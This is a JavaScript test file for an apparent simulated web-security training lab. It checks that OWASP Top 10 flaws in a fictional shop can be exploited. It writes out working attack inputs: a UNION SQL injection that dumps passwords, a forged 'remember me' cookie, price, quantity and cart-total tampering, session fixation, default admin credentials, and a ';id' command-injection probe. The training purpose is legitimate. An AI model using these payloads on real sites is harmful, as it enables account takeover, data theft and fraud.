import test from 'node:test';
import assert from 'node:assert/strict';
import { makeShell } from './helpers.mjs';

// Covers everything added for the full OWASP Top 10 chapter: A02 (exposed .git), A03 (exposed
// package.json), A04 (plaintext passwords via SQLi, forgeable "remember me"), A06 (price/qty tampering),
// A07 (username enumeration, session fixation), A08 (cart total tampering), A09/A10 (log + error content).

async function login(sh, username, password, extra = '') {
  return sh.run(`curl -i -d 'username=${username}&password=${password}${extra}' http://shop.acme.test/login`);
}
function cookieOf(out, name) {
  const re = new RegExp(`${name}=([^;\\s]+)`);
  return re.exec(out)?.[1];
}

// ---------------- A02 Security Misconfiguration ----------------
test('A02: exposed .git/config leaks internal hosting info and a flag', async () => {
  const sh = makeShell();
  const out = (await sh.run('curl -s http://10.10.20.5/.git/config')).out;
  assert.match(out, /url = git@gitlab\.acme\.test:webteam\/acme-site\.git/);
  assert.match(out, /FLAG\{exposed_git_folder_leaks_your_source\}/);
});

test('A02: default credentials admin/admin log in successfully', async () => {
  const sh = makeShell();
  const ok = await sh.run("curl -i -d 'user=admin&pass=admin' http://10.10.20.5/login");
  assert.match(ok.out, /^HTTP\/1\.1 302 Found/);
  assert.match(ok.out, /Location: \/admin\//);
  assert.match(ok.out, /Set-Cookie: session=demo; HttpOnly/);
  const wrong = await sh.run("curl -d 'user=admin&pass=wrong' http://10.10.20.5/login");
  assert.match(wrong.out, /Invalid username or password/);
});

// ---------------- A03 Software Supply Chain Failures ----------------
test('A03: exposed package.json reveals a vulnerable dependency version', async () => {
  const sh = makeShell();
  const out = (await sh.run('curl -s http://shop.acme.test/package.json')).out;
  const pkg = JSON.parse(out);
  assert.equal(pkg.dependencies.lodash, '4.17.4');
  assert.equal(pkg.name, 'shopzone');
});

test('A03: whatweb still reports the outdated jQuery on acme-site (built in chapter 3)', async () => {
  const sh = makeShell();
  assert.match((await sh.run('whatweb 10.10.20.5')).out, /JQuery\[1\.12\.4\]/);
});

// ---------------- A04 Cryptographic Failures ----------------
test('A04: UNION SQLi dump shows passwords stored as plaintext, not hashed', async () => {
  const sh = makeShell();
  const payload = "zzz' UNION SELECT id, concat(username,':',password), 0 FROM users-- -";
  const dump = (await sh.run(`curl -s -G --data-urlencode "q=${payload}" http://shop.acme.test/search`)).out;
  assert.match(dump, /alice:alice123/, 'the password is readable plaintext, not something like a bcrypt hash');
  assert.doesNotMatch(dump, /\$2[aby]\$/, 'a properly hashed password would look like a bcrypt hash, not this');
});

test('A04: the "remember me" cookie is just base64(username) - forge one and log in as anyone', async () => {
  const sh = makeShell();
  const login1 = await login(sh, 'alice', 'alice123', '&remember=1');
  const remember = cookieOf(login1.out, 'remember');
  assert.ok(remember, 'remember cookie should be set');
  assert.equal(Buffer.from(remember, 'base64').toString(), 'alice');
  // forging it for "admin" (no password ever supplied) grants an admin session
  const forged = Buffer.from('admin').toString('base64');
  const asAdmin = (await sh.run(`curl -s -b 'remember=${forged}' http://shop.acme.test/account`)).out;
  assert.match(asAdmin, /Welcome, admin/);
});

test('A04: an invalid/garbled remember cookie is just treated as logged out', async () => {
  const sh = makeShell();
  assert.match((await sh.run("curl -i -b 'remember=not-valid-base64!!!' http://shop.acme.test/account")).out, /^HTTP\/1\.1 302 Found/);
  assert.match((await sh.run(`curl -i -b 'remember=${Buffer.from('ghost-user').toString('base64')}' http://shop.acme.test/account`)).out, /^HTTP\/1\.1 302 Found/, 'a real-looking but unknown username still fails');
});

// ---------------- A06 Insecure Design ----------------
test('A06: overriding the price parameter buys an expensive item for almost nothing', async () => {
  const sh = makeShell();
  await login(sh, 'alice', 'alice123');
  const login1 = await login(sh, 'alice', 'alice123');
  const cookie = cookieOf(login1.out, 'session');
  const out = (await sh.run(`curl -s -b 'session=${cookie}' -G --data-urlencode 'product_id=2' --data-urlencode 'qty=1' --data-urlencode 'price=0.01' --data-urlencode 'confirm=1' http://shop.acme.test/buy`)).out;
  assert.match(out, /Mechanical Keyboard = \$0\.01/);
  const account = (await sh.run(`curl -s -b 'session=${cookie}' http://shop.acme.test/account`)).out;
  assert.match(account, /\$0\.01/);
});

test('A06: a negative quantity produces a negative total (no quantity validation at all)', async () => {
  const sh = makeShell();
  const login1 = await login(sh, 'bob', 'Password1');
  const cookie = cookieOf(login1.out, 'session');
  const out = (await sh.run(`curl -s -b 'session=${cookie}' -G --data-urlencode 'product_id=2' --data-urlencode 'qty=-5' --data-urlencode 'confirm=1' http://shop.acme.test/buy`)).out;
  assert.match(out, /-5 × Mechanical Keyboard = \$-299\.95/);
});

test('A06: /buy requires login and rejects an unknown product', async () => {
  const sh = makeShell();
  assert.match((await sh.run('curl -i http://shop.acme.test/buy?product_id=1')).out, /^HTTP\/1\.1 302 Found\n[\s\S]*Location: \/login/);
  const login1 = await login(sh, 'alice', 'alice123');
  const cookie = cookieOf(login1.out, 'session');
  assert.match((await sh.run(`curl -i -b 'session=${cookie}' http://shop.acme.test/buy?product_id=999`)).out, /^HTTP\/1\.1 404 Not Found/);
});

// ---------------- A07 Authentication Failures ----------------
test('A07: /forgot-password responds differently for a real vs. a fake username', async () => {
  const sh = makeShell();
  const real = (await sh.run('curl -s http://shop.acme.test/forgot-password?username=admin')).out;
  const fake = (await sh.run('curl -s http://shop.acme.test/forgot-password?username=totally_not_a_user')).out;
  assert.match(real, /มีบัญชีนี้อยู่ในระบบ/);
  assert.match(fake, /ไม่พบบัญชีผู้ใช้ชื่อ/);
  assert.notEqual(real.includes('มีบัญชีนี้อยู่ในระบบ'), fake.includes('มีบัญชีนี้อยู่ในระบบ'));
});

test('A07: session fixation - a pre-chosen cookie becomes valid once the victim logs in with it', async () => {
  const sh = makeShell();
  const fixedToken = 'attackerchosentoken1234567890ab';
  // "attacker" primes a session cookie by just visiting with it set, before anyone has logged in
  assert.match((await sh.run(`curl -i -b 'session=${fixedToken}' http://shop.acme.test/account`)).out, /^HTTP\/1\.1 302 Found/, 'not logged in yet');
  // "victim" logs in while that same cookie value is still attached to the request
  const victimLogin = await sh.run(`curl -i -b 'session=${fixedToken}' -d 'username=bob&password=Password1' http://shop.acme.test/login`);
  assert.doesNotMatch(victimLogin.out, new RegExp(`session=(?!${fixedToken})[0-9a-f]+`), 'the server must not silently issue a different token');
  assert.match(victimLogin.out, new RegExp(`session=${fixedToken}`), 'the fixed token is the one the server kept using');
  // the attacker, who never saw bob's password, uses that exact pre-chosen value and is now bob
  const asVictim = (await sh.run(`curl -s -b 'session=${fixedToken}' http://shop.acme.test/account`)).out;
  assert.match(asVictim, /Welcome, bob/);
});

test('A07: a normal login with no pre-existing cookie still gets a fresh random token', async () => {
  const sh = makeShell();
  const a = cookieOf((await login(sh, 'alice', 'alice123')).out, 'session');
  const sh2 = makeShell();
  const b = cookieOf((await login(sh2, 'alice', 'alice123')).out, 'session');
  assert.notEqual(a, b);
  assert.match(a, /^[0-9a-f]{24}$/);
});

// ---------------- A08 Software or Data Integrity Failures ----------------
test('A08: tampering the base64 cart cookie changes the checkout total', async () => {
  const sh = makeShell();
  const login1 = await login(sh, 'alice', 'alice123');
  const cookie = cookieOf(login1.out, 'session');
  const cartOut = await sh.run(`curl -i -b 'session=${cookie}' http://shop.acme.test/cart`);
  const realCart = cookieOf(cartOut.out, 'cart');
  const decoded = JSON.parse(Buffer.from(realCart, 'base64').toString());
  assert.equal(decoded.total, 59.99, 'the real cart reflects the Mechanical Keyboard\'s real price');
  const tampered = { ...decoded, total: 0.01 };
  const tamperedCart = Buffer.from(JSON.stringify(tampered)).toString('base64');
  await sh.run(`curl -s -b 'session=${cookie};cart=${tamperedCart}' http://shop.acme.test/cart/checkout`);
  const account = (await sh.run(`curl -s -b 'session=${cookie}' http://shop.acme.test/account`)).out;
  assert.match(account, /\$0\.01/, 'an order for the tampered (fake) total was created');
});

test('A08: checkout with no cart cookie at all redirects back to /cart', async () => {
  const sh = makeShell();
  const login1 = await login(sh, 'bob', 'Password1');
  const cookie = cookieOf(login1.out, 'session');
  assert.match((await sh.run(`curl -i -b 'session=${cookie}' http://shop.acme.test/cart/checkout`)).out, /^HTTP\/1\.1 302 Found\n[\s\S]*Location: \/cart/);
});

test('A08: checkout requires a logged-in session', async () => {
  const sh = makeShell();
  assert.match((await sh.run('curl -i http://shop.acme.test/cart/checkout')).out, /^HTTP\/1\.1 302 Found\n[\s\S]*Location: \/login/);
});

// ---------------- A09 Security Logging & Alerting Failures (Blue Team) ----------------
test('A09: the web server access log on web01 records the attacker\'s SQLi attempts', async () => {
  // the mission grants root on web01 for this review (www-data itself cannot read root:adm 640 logs -
  // which is itself realistic: the web server user should not be able to read its own audit trail)
  const sh = makeShell('root', { machine: 'acme-web01' });
  const log = (await sh.run('cat /var/log/apache2/access.log')).out;
  assert.match(log, /UNION%20SELECT/i, 'logged as received, percent-encoded, same as a real access log');
  assert.match(log, /10\.10\.14\.77/, 'the same attacker IP seen brute-forcing SSH in chapter 1 shows up here too');
  assert.match(log, /"GET \/admin\/diagnostics\?host=127\.0\.0\.1%3Bid HTTP\/1\.1" 200/, 'the command-injection probe also returned 200 - nothing blocked or flagged it');
});

// ---------------- A10 Mishandling of Exceptional Conditions ----------------
test('A10: a malformed login payload leaks an internal file path in a 500 error', async () => {
  const sh = makeShell();
  const r = await sh.run(`curl -i -d "username=admin'&password=x" http://shop.acme.test/login`);
  assert.match(r.out, /^HTTP\/1\.1 500 Internal Server Error/);
  assert.match(r.out, /\/var\/www\/html\/db\.php:42/);
  assert.match(r.out, /Uncaught mysqli_sql_exception/);
});
